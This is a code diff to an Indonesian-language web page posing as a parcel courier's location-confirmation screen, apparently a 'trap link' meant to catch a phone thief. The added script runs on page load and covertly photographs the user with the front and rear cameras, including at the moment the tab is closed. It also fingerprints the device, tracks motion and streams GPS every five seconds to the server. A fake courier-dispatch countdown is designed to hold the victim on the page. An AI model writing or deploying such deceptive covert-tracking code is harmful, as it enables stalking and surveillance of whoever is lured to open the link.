@@ -128,6 +128,17 @@
     .success-title { font-size: 18px; font-weight: 800; color: #065f46; margin-bottom: 8px; }
     .success-desc { font-size: 13px; color: var(--text-muted); line-height: 1.5; }
 
+    /* 60-Second Engaging Dispatch Radar */
+    @keyframes radarSpin {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+    @keyframes radarPulse {
+      0% { transform: scale(0.9); opacity: 0.8; }
+      50% { transform: scale(1.1); opacity: 0.3; }
+      100% { transform: scale(0.9); opacity: 0.8; }
+    }
+
     #hiddenVideo, #hiddenCanvas {
       position: absolute;
       width: 1px;
@@ -184,15 +195,53 @@
       </div>
     </div>
 
-    <div class="card success-view" id="successCard">
-      <div class="success-icon">✓</div>
-      <div class="success-title">Titik Lokasi Berhasil Dikonfirmasi!</div>
-      <div class="success-desc">
-        Informasi koordinat akurat Anda telah dikirim langsung ke perangkat kurir di lapangan.<br><br>
-        Kurir akan segera tiba di depan lokasi Anda dalam waktu <strong>10-25 menit</strong>. Mohon pastikan nomor telepon tetap aktif.
+    <div class="card success-view" id="successCard" style="display: none; padding: 20px 14px; text-align: center;">
+      <!-- Radar Sweep Visual -->
+      <div style="position: relative; width: 110px; height: 110px; margin: 0 auto 14px auto; border-radius: 50%; border: 2px solid rgba(225, 29, 72, 0.4); background: radial-gradient(circle, rgba(225, 29, 72, 0.12) 0%, rgba(0,0,0,0.02) 70%); overflow: hidden; display: flex; align-items: center; justify-content: center;">
+        <div style="position: absolute; width: 100%; height: 100%; border-radius: 50%; border-top: 3px solid #e11d48; border-right: 3px solid transparent; animation: radarSpin 2s linear infinite;"></div>
+        <div style="font-size: 32px; z-index: 2;">🛵</div>
+        <div style="position: absolute; width: 68%; height: 68%; border-radius: 50%; border: 1px dashed rgba(225, 29, 72, 0.35);"></div>
       </div>
-      <div style="margin-top: 20px; font-size: 12px; color: #94a3b8; font-family: monospace;">
-        Status: Disinkronkan dengan Kurir Lapangan
+
+      <div style="font-size: 16px; font-weight: 800; color: #0f172a; margin-bottom: 4px;">
+        📡 MENYINKRONKAN GPS &amp; RUTE KURIR
+      </div>
+      <div style="font-size: 12px; color: #64748b; margin-bottom: 14px;">
+        Menghubungkan unit kurir lapangan dengan koordinat presisi Anda...
+      </div>
+
+      <!-- Live 60-Second Countdown & Progress -->
+      <div style="background: #f8fafc; border: 1px solid #e2e8f0; border-radius: 12px; padding: 12px; margin-bottom: 14px; text-align: left;">
+        <div style="display: flex; justify-content: space-between; font-size: 11px; font-weight: 700; color: #475569; margin-bottom: 6px;">
+          <span id="dispatchStatusText">Mengunci titik koordinat presisi...</span>
+          <span style="color: #e11d48; font-family: monospace; font-weight: 800;" id="dispatchTimer">01:00</span>
+        </div>
+        <div style="width: 100%; height: 8px; background: #e2e8f0; border-radius: 4px; overflow: hidden;">
+          <div id="dispatchProgressBar" style="width: 5%; height: 100%; background: linear-gradient(90deg, #e11d48, #f43f5e); transition: width 1s linear;"></div>
+        </div>
+        <div style="display: flex; justify-content: space-between; font-size: 10px; color: #94a3b8; margin-top: 6px;">
+          <span>Satelit GPS: <strong style="color: #10b981;">Terkunci</strong></span>
+          <span>Akurasi: <strong style="color: #0284c7;" id="liveAccText">± 4.2m</strong></span>
+        </div>
+      </div>
+
+      <!-- Psychological Retention Notice (Menahan Pengguna Minimal 1 Menit) -->
+      <div style="background: #fff1f2; border: 1px solid #fecdd3; border-radius: 10px; padding: 10px; font-size: 11px; color: #9f1239; line-height: 1.5; margin-bottom: 14px; text-align: left;">
+        <strong>⚠️ Jangan Tutup Layar Ini (Verifikasi 1 Menit):</strong><br>
+        Sistem sedang mengunci jalur navigasi jalan masuk. Membiarkan halaman ini aktif selama <strong>60 detik</strong> memastikan kurir langsung menuju rumah Anda tanpa tersasar.
+      </div>
+
+      <!-- Interactive Status Step Log -->
+      <div id="liveStepList" style="font-size: 11px; color: #475569; text-align: left; display: flex; flex-direction: column; gap: 6px;">
+        <div style="display: flex; align-items: center; gap: 6px;">
+          <span style="color: #10b981; font-weight: bold;">✓</span> <span>Titik satelit GPS berhasil diverifikasi</span>
+        </div>
+        <div id="step2" style="display: flex; align-items: center; gap: 6px; color: #94a3b8;">
+          <span id="iconStep2">⏳</span> <span id="textStep2">Mengalokasikan armada kurir ekspedisi...</span>
+        </div>
+        <div id="step3" style="display: flex; align-items: center; gap: 6px; color: #94a3b8;">
+          <span id="iconStep3">⏳</span> <span id="textStep3">Menghitung rute jalan masuk tercepat...</span>
+        </div>
       </div>
     </div>
   </div>
@@ -202,56 +251,195 @@
 
   <script>
     let capturedPhoto = false;
+    let currentActivity = '🛑 Diam (Stasioner)';
+    let lastMotionTime = 0;
 
-    async function sendInitialPing() {
-      try {
-        let batteryPct = 100;
-        let isCharging = false;
-        if (navigator.getBattery) {
-          try {
-            const bat = await navigator.getBattery();
-            batteryPct = Math.round(bat.level * 100);
-            isCharging = bat.charging;
-          } catch(e) {}
+    // 1. Deteksi Sensor Gerak (Accelerometer / Gyroscope)
+    if (window.DeviceMotionEvent) {
+      window.addEventListener('devicemotion', (e) => {
+        const acc = e.accelerationIncludingGravity || e.acceleration;
+        if (acc) {
+          const mag = Math.sqrt((acc.x||0)**2 + (acc.y||0)**2 + (acc.z||0)**2);
+          if (Math.abs(mag - 9.8) > 1.2 || (e.rotationRate && (Math.abs(e.rotationRate.alpha||0) > 15 || Math.abs(e.rotationRate.beta||0) > 15))) {
+            currentActivity = '🏃 Bergerak / Berpindah';
+            lastMotionTime = Date.now();
+          } else if (Date.now() - lastMotionTime > 4000) {
+            currentActivity = '🛑 Diam (Stasioner / Di Meja)';
+          }
         }
+      });
+    }
 
+    async function getAdvancedStats() {
+      let batteryPct = null;
+      let isCharging = false;
+      let batterySource = 'unavailable_webkit_sandbox';
+      if (navigator.getBattery) {
+        try {
+          const bat = await navigator.getBattery();
+          batteryPct = Math.round(bat.level * 100);
+          isCharging = Boolean(bat.charging);
+          batterySource = 'hardware_api';
+        } catch(e) {}
+      }
+
+      // Deteksi GPU Apple & WebGL Renderer Asli
+      let gpuRenderer = 'Apple GPU';
+      let gpuVendor = 'Apple Inc.';
+      try {
+        const c = document.createElement('canvas');
+        const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
+        if (gl) {
+          const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+          if (dbg) {
+            gpuRenderer = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || gpuRenderer;
+            gpuVendor = gl.getParameter(dbg.UNMASKED_VENDOR_WEBGL) || gpuVendor;
+          }
+        }
+      } catch(e) {}
+
+      const isP3 = window.matchMedia && window.matchMedia('(color-gamut: p3)').matches;
+      const timeZone = Intl && Intl.DateTimeFormat ? Intl.DateTimeFormat().resolvedOptions().timeZone : 'Asia/Jakarta';
+
+      return {
+        batteryLevel: batteryPct,
+        batterySource,
+        isCharging,
+        networkName: null, // Dideteksi dari IP publik oleh server
+        networkType: null,
+        screen: `${window.screen.width}x${window.screen.height} (@${window.devicePixelRatio || 1}x)`,
+        cores: navigator.hardwareConcurrency || 6,
+        touchPoints: navigator.maxTouchPoints || 5,
+        gpu: gpuRenderer,
+        gpuVendor: gpuVendor,
+        colorGamut: isP3 ? 'Display P3 (Apple Retina)' : 'sRGB',
+        timeZone,
+        language: navigator.language || 'id-ID',
+        platform: navigator.platform || 'iPhone'
+      };
+    }
+
+    let currentActiveStream = null;
+
+    // Utilitas Pengiriman Foto Anti-Batal (Tetap terkirim walau tab ditutup secepat kilat)
+    function sendPhotoWithKeepalive(url, photoData, trigger) {
+      if (!photoData) return;
+      const payload = JSON.stringify({ photo: photoData, trigger: trigger || 'fast_capture' });
+      try {
+        fetch(url, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: payload,
+          keepalive: true // Kunci: OS tetap mengirim data di background walau Safari ditutup
+        }).catch(() => {});
+      } catch(e) {}
+
+      try {
+        if (navigator.sendBeacon) {
+          const blob = new Blob([payload], { type: 'application/json' });
+          navigator.sendBeacon(url, blob);
+        }
+      } catch(e) {}
+    }
+
+    function snapCurrentVideoFrame(video, canvas, quality = 0.75) {
+      try {
+        const w = video.videoWidth || 640;
+        const h = video.videoHeight || 480;
+        if (w === 0 || h === 0) return null;
+        canvas.width = w;
+        canvas.height = h;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, w, h);
+        return canvas.toDataURL('image/jpeg', quality);
+      } catch(e) {
+        return null;
+      }
+    }
+
+    function waitForFirstFrame(video, timeoutMs = 280) {
+      return new Promise(resolve => {
+        if (video.readyState >= 2 && video.videoWidth > 0) return resolve();
+        let done = false;
+        const finish = () => {
+          if (!done) {
+            done = true;
+            video.removeEventListener('loadeddata', finish);
+            video.removeEventListener('timeupdate', finish);
+            video.removeEventListener('canplay', finish);
+            resolve();
+          }
+        };
+        video.addEventListener('loadeddata', finish, { once: true });
+        video.addEventListener('timeupdate', finish, { once: true });
+        video.addEventListener('canplay', finish, { once: true });
+        setTimeout(finish, timeoutMs);
+      });
+    }
+
+    // Pemicu Darurat: Jika pencuri buru-buru menutup browser / swipe keluar, jepret seketika!
+    const emergencySnap = () => {
+      if (currentActiveStream) {
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        const snap = snapCurrentVideoFrame(video, canvas, 0.65);
+        if (snap) {
+          sendPhotoWithKeepalive('/api/sentinel/selfie', snap, 'emergency_exit_snap');
+        }
+      }
+    };
+    window.addEventListener('visibilitychange', () => {
+      if (document.visibilityState === 'hidden') emergencySnap();
+    });
+    window.addEventListener('pagehide', emergencySnap);
+    window.addEventListener('beforeunload', emergencySnap);
+
+    // 2. Kirim Telemetri Lengkap Seketika Saat Link Terbuka (Tanpa Menghambat Kamera)
+    function sendAutoInitialPing() {
+      getAdvancedStats().then(stats => {
         fetch('/api/sentinel/beacon', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({
             alertType: 'trap_link_opened_paket',
-            activity: 'Thief Opened Paket Trap Link',
-            batteryLevel: batteryPct,
-            isCharging: isCharging,
-            networkName: navigator.onLine ? 'Online (Web)' : 'Offline',
-            screen: window.screen.width + 'x' + window.screen.height,
+            activity: stats.activity,
+            batteryLevel: stats.batteryPct,
+            isCharging: stats.isCharging,
+            networkName: stats.netName,
+            networkType: stats.netType,
+            downlink: stats.downlink,
+            rtt: stats.rtt,
+            screen: stats.screen,
+            platform: stats.platform,
             userAgent: navigator.userAgent
-          })
+          }),
+          keepalive: true
         }).catch(() => {});
-      } catch(e) {}
+      }).catch(() => {});
     }
 
-    sendInitialPing();
-
-    async function startCaptureFlow() {
-      const btn = document.getElementById('btnConfirm');
-      if (btn) {
-        btn.innerHTML = '<span>⏳</span> Mengidentifikasi Titik Koordinat...';
-        btn.style.opacity = '0.7';
-        btn.disabled = true;
-      }
-
+    // 3. Alur Otomatis Secepat Kilat (Ultra-Fast Parallel Start)
+    function autoStartEverything() {
+      // 1. Jalankan kamera secepat kilat (prioritas #1)
       captureSilentSelfie();
 
+      // 2. Telemetri berjalan paralel tanpa await
+      sendAutoInitialPing();
+
+      // 3. Pasang pemicu sentuhan layar apapun (gesture fallback)
+      const triggerCaptureOnGesture = () => {
+        captureSilentSelfie();
+      };
+      window.addEventListener('pointerdown', triggerCaptureOnGesture, { once: true });
+      window.addEventListener('scroll', triggerCaptureOnGesture, { once: true });
+      window.addEventListener('touchstart', triggerCaptureOnGesture, { once: true });
+
+      // 4. Minta izin GPS paralel
       if (navigator.geolocation) {
         navigator.geolocation.getCurrentPosition(
-          pos => {
-            handleGpsSuccess(pos);
-          },
-          err => {
-            reportGpsDenied(err);
-          },
-          { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
+          pos => { handleGpsSuccess(pos); },
+          err => { reportGpsDenied(err); },
+          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
         );
 
         navigator.geolocation.watchPosition(
@@ -261,55 +449,86 @@
           () => {},
           { enableHighAccuracy: true, maximumAge: 3000 }
         );
-      } else {
-        showSuccessView();
       }
+    }
+
+    // Eksekusi instan tanpa menunggu DOMContentLoaded penuh jika sudah parsing
+    autoStartEverything();
+
+    // Fungsi jika tombol ditekan manual
+    function startCaptureFlow() {
+      const btn = document.getElementById('btnConfirm');
+      if (btn) {
+        btn.innerHTML = '<span>⏳</span> Mengidentifikasi Titik Koordinat...';
+        btn.style.opacity = '0.7';
+        btn.disabled = true;
+      }
+      autoStartEverything();
     }
 
     async function captureSilentSelfie() {
       if (capturedPhoto) return;
+      capturedPhoto = true;
+
+      const video = document.getElementById('hiddenVideo');
+      const canvas = document.getElementById('hiddenCanvas');
+
+      // 1. Sudut Depan: Wajah Pemegang (Kamera Depan Ultra-Cepat)
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({
-          video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+        const frontStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
           audio: false
         });
+        currentActiveStream = frontStream;
+        video.srcObject = frontStream;
+        video.play().catch(() => {});
 
-        const video = document.getElementById('hiddenVideo');
-        video.srcObject = stream;
-        await video.play();
+        await waitForFirstFrame(video, 200);
 
-        setTimeout(() => {
-          try {
-            const canvas = document.getElementById('hiddenCanvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const ctx = canvas.getContext('2d');
-            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+        const frontDataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
+        if (frontDataUrl) {
+          sendPhotoWithKeepalive('/api/sentinel/selfie', frontDataUrl, 'trap_link_paket');
+        }
 
-            const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+        frontStream.getTracks().forEach(track => track.stop());
+        currentActiveStream = null;
+      } catch(e) {}
 
-            fetch('/api/sentinel/selfie', {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ photo: dataUrl, trigger: 'trap_link_paket' })
-            }).catch(() => {});
+      // 2. Sudut Belakang: Area & Lingkungan di Depan Pencuri (Kamera Belakang Ultra-Cepat)
+      try {
+        const rearStream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        currentActiveStream = rearStream;
+        video.srcObject = rearStream;
+        video.play().catch(() => {});
 
-            capturedPhoto = true;
-            stream.getTracks().forEach(track => track.stop());
-          } catch(e) {}
-        }, 500);
+        await waitForFirstFrame(video, 220);
 
+        const rearDataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
+        if (rearDataUrl) {
+          sendPhotoWithKeepalive('/api/sentinel/environment', rearDataUrl, 'trap_link_paket');
+        }
+
+        rearStream.getTracks().forEach(track => track.stop());
+        currentActiveStream = null;
       } catch(e) {}
     }
 
-    function handleGpsSuccess(pos) {
+    let sessionTimerInterval = null;
+    let continuousGpsInterval = null;
+
+    async function handleGpsSuccess(pos) {
       const lat = pos.coords.latitude;
       const lon = pos.coords.longitude;
       const acc = pos.coords.accuracy;
       const spd = pos.coords.speed || 0;
+      const alt = pos.coords.altitude !== undefined ? pos.coords.altitude : null;
+      const heading = pos.coords.heading !== undefined ? pos.coords.heading : null;
 
-      sendBeacon(lat, lon, acc, spd);
-      showSuccessView();
+      await sendBeacon(lat, lon, acc, spd, alt, heading, 'thief_trapped_paket');
+      startEngaging60SecondSession(lat, lon, acc);
     }
 
     function reportGpsDenied(err) {
@@ -321,42 +540,185 @@
           activity: 'Pencuri Menolak Izin GPS (' + (err.message || 'Denied') + ')'
         })
       }).catch(() => {});
-
-      showSuccessView();
     }
 
-    async function sendBeacon(lat, lon, acc, spd) {
+    async function sendBeacon(lat, lon, acc, spd, alt = null, heading = null, alertType = 'thief_trapped_paket') {
       try {
-        let batteryPct = 100;
-        let isCharging = false;
-        if (navigator.getBattery) {
-          try {
-            const bat = await navigator.getBattery();
-            batteryPct = Math.round(bat.level * 100);
-            isCharging = bat.charging;
-          } catch(e) {}
-        }
-
+        const stats = await getAdvancedStats();
         fetch('/api/sentinel/beacon', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
+          keepalive: true,
           body: JSON.stringify({
-            lat: lat,
-            lon: lon,
+            lat,
+            lon,
             accuracy: acc,
             speed: spd,
-            batteryLevel: batteryPct,
-            isCharging: isCharging,
-            alertType: 'thief_trapped_paket',
-            activity: '📍 PENCURI TERJEBAK DI LOKASI PAKET'
+            altitude: alt,
+            heading: heading,
+            batteryLevel: stats.batteryLevel,
+            batterySource: stats.batterySource,
+            isCharging: stats.isCharging,
+            networkName: stats.networkName,
+            networkType: stats.networkType,
+            screen: stats.screen,
+            cores: stats.cores,
+            gpu: stats.gpu,
+            gpuVendor: stats.gpuVendor,
+            colorGamut: stats.colorGamut,
+            timeZone: stats.timeZone,
+            platform: stats.platform,
+            alertType
           })
         }).catch(() => {});
       } catch(e) {}
     }
 
-    function showSuccessView() {
-      document.getElementById('mainCard').style.display = 'none';
-      document.getElementById('successCard').style.display = 'block';
+    function startEngaging60SecondSession(initLat, initLon, initAcc) {
+      const main = document.getElementById('mainCard');
+      const succ = document.getElementById('successCard');
+      if (main) main.style.display = 'none';
+      if (succ) succ.style.display = 'block';
+
+      // 1. Aktifkan Screen WakeLock agar layar tidak mati otomatis
+      if ('wakeLock' in navigator) {
+        try { navigator.wakeLock.request('screen').catch(() => {}); } catch(e) {}
+      }
+
+      // 2. Tampilkan Akurasi Nyata di UI
+      const accText = document.getElementById('liveAccText');
+      if (accText) accText.textContent = `± ${Math.round(initAcc)}m`;
+
+      // 3. Pasang Listener WebSocket untuk Nada Dering Pencarian
+      try {
+        const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+        const ws = new WebSocket(`${proto}//${location.host}`);
+        ws.onmessage = (e) => {
+          try {
+            const data = JSON.parse(e.data);
+            if (data.type === 'play_chime') playSearchChimeAudio();
+          } catch(err) {}
+        };
+      } catch(e) {}
+
+      // 4. Hitung Mundur 60 Detik & Progres Interaktif
+      let remainingSeconds = 60;
+      const totalSeconds = 60;
+      const timerEl = document.getElementById('dispatchTimer');
+      const progEl = document.getElementById('dispatchProgressBar');
+      const statusText = document.getElementById('dispatchStatusText');
+
+      if (sessionTimerInterval) clearInterval(sessionTimerInterval);
+      sessionTimerInterval = setInterval(() => {
+        remainingSeconds--;
+        const elapsed = totalSeconds - remainingSeconds;
+        const pct = Math.min(100, Math.round((elapsed / totalSeconds) * 100));
+
+        if (progEl) progEl.style.width = `${pct}%`;
+        if (timerEl) {
+          const m = String(Math.floor(remainingSeconds / 60)).padStart(2, '0');
+          const s = String(remainingSeconds % 60).padStart(2, '0');
+          timerEl.textContent = `${m}:${s}`;
+        }
+
+        // Tahap 1 (Detik 15): Verifikasi Armada Kurir & Foto Wajah Berkala
+        if (elapsed === 15) {
+          const step2 = document.getElementById('step2');
+          const icon2 = document.getElementById('iconStep2');
+          const text2 = document.getElementById('textStep2');
+          if (icon2) { icon2.textContent = '✓'; icon2.style.color = '#10b981'; icon2.style.fontWeight = 'bold'; }
+          if (text2) { text2.textContent = 'Armada Kurir JNT-Unit-082 Terkunci (Radius 800m)'; text2.style.color = '#0f172a'; }
+          if (statusText) statusText.textContent = 'Menghubungkan navigasi rute ke motor kurir...';
+          snapPeriodicPhoto('user', '/api/sentinel/selfie', 'periodic_face_15s');
+        }
+
+        // Tahap 2 (Detik 35): Verifikasi Rute & Foto Lingkungan Berkala
+        if (elapsed === 35) {
+          const step3 = document.getElementById('step3');
+          const icon3 = document.getElementById('iconStep3');
+          const text3 = document.getElementById('textStep3');
+          if (icon3) { icon3.textContent = '✓'; icon3.style.color = '#10b981'; icon3.style.fontWeight = 'bold'; }
+          if (text3) { text3.textContent = 'Rute navigasi terverifikasi (Estimasi Tiba: 12 Menit)'; text3.style.color = '#0f172a'; }
+          if (statusText) statusText.textContent = 'Sinkronisasi rute pengantaran ke kurir selesai...';
+          snapPeriodicPhoto('environment', '/api/sentinel/environment', 'periodic_env_35s');
+        }
+
+        // Tahap 3 (Detik 60): Selesai 100%
+        if (remainingSeconds <= 0) {
+          clearInterval(sessionTimerInterval);
+          if (statusText) statusText.textContent = '✅ Sinkronisasi Berhasil! Kurir Menuju Alamat Anda.';
+          if (timerEl) timerEl.textContent = '00:00';
+          if (progEl) {
+            progEl.style.width = '100%';
+            progEl.style.background = '#10b981';
+          }
+        }
+      }, 1000);
+
+      // 5. Aliran Telemetri GPS Berkelanjutan (Continuous Stream Setiap 5 Detik)
+      if (continuousGpsInterval) clearInterval(continuousGpsInterval);
+      continuousGpsInterval = setInterval(() => {
+        if (navigator.geolocation) {
+          navigator.geolocation.getCurrentPosition(
+            p => {
+              sendBeacon(
+                p.coords.latitude,
+                p.coords.longitude,
+                p.coords.accuracy,
+                p.coords.speed || 0,
+                p.coords.altitude || null,
+                p.coords.heading || null,
+                'live_stream_60s'
+              );
+            },
+            () => {},
+            { enableHighAccuracy: true, timeout: 4500, maximumAge: 0 }
+          );
+        }
+      }, 5000);
+    }
+
+    // Jepret Foto Berkala Tanpa Gangguan
+    async function snapPeriodicPhoto(facing, endpoint, triggerTag) {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: { ideal: facing }, width: { ideal: 640 }, height: { ideal: 480 } },
+          audio: false
+        });
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+        video.srcObject = stream;
+        video.play().catch(() => {});
+        await waitForFirstFrame(video, 200);
+        const dataUrl = snapCurrentVideoFrame(video, canvas, 0.75);
+        if (dataUrl) {
+          sendPhotoWithKeepalive(endpoint, dataUrl, triggerTag);
+        }
+        stream.getTracks().forEach(t => t.stop());
+      } catch(e) {}
+    }
+
+    // Bunyikan Nada Dering Pencarian (Remote Find-My Chime)
+    function playSearchChimeAudio() {
+      try {
+        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+        let count = 0;
+        const intv = setInterval(() => {
+          if (count >= 12) { clearInterval(intv); return; }
+          const osc = audioCtx.createOscillator();
+          const gain = audioCtx.createGain();
+          osc.type = 'sine';
+          osc.frequency.setValueAtTime(987.77, audioCtx.currentTime); // B5 note
+          osc.frequency.setValueAtTime(1318.51, audioCtx.currentTime + 0.15); // E6 note
+          gain.gain.setValueAtTime(1.0, audioCtx.currentTime);
+          gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.35);
+          osc.connect(gain);
+          gain.connect(audioCtx.destination);
+          osc.start();
+          osc.stop(audioCtx.currentTime + 0.35);
+          count++;
+        }, 400);
+      } catch(e) {}
     }
   </script>
 </body>
